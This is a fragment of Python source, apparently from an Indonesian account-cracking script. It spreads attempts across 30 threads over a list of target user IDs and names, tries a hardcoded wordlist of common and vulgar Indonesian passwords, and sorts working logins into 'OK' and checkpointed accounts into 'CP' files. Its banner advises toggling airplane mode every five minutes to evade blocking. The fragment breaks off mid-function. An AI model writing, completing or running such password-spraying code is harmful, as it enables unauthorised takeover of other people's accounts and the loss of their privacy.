...
def passwrd():
	...
	krek = '\33[1;32mHasil Live  Disimpan Ke : OK/%s\n\33[1;33mHasil Check Disimpan Ke : CP/%s\n\33[31;1mMode Pesawat Setiap 5 Menit, jika Masih tidak ada hasil, silahkan banting hp mu lalu beli hp baru, ojo di pek batine ae Gak gelem ganti HP'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['memek123','cintasuci','cintaku','terserah','surabaya','rahasia','indonesia','jancok','kontol','jancok123','kontol123','sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','anjing123']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
